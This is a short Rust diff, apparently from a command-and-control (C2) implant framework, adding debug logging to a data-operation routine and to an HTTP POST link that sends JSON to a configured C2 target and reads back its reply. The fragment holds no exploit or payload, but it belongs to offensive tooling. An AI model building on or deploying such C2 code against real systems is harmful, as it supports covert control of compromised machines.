@@ -152,6 +152,7 @@ pub trait LinkFetch {
     }
 
     fn un_apply_all_dataoperations(&self, mut data: Vec<u8>) -> Result<Vec<u8>, anyhow::Error> {
+        debug!("DATAOPERATION: {:?}",self.get_dataoperation());
         for operation in self.get_dataoperation() {
             data = operation.un_apply_one_operation(data)?;
         }
@@ -465,6 +466,9 @@ impl LinkFetch for HTTPPostC2Link {
         let mut res = client.post(&self.get_target()).json(&yolo).send()?;
         let mut body: Vec<u8> = Vec::new();
         res.read_to_end(&mut body)?;
+
+        // TODO remove debug
+        //debug!("body:{}",std::str::from_utf8(&body).unwrap());
         Ok(body)
     }
 
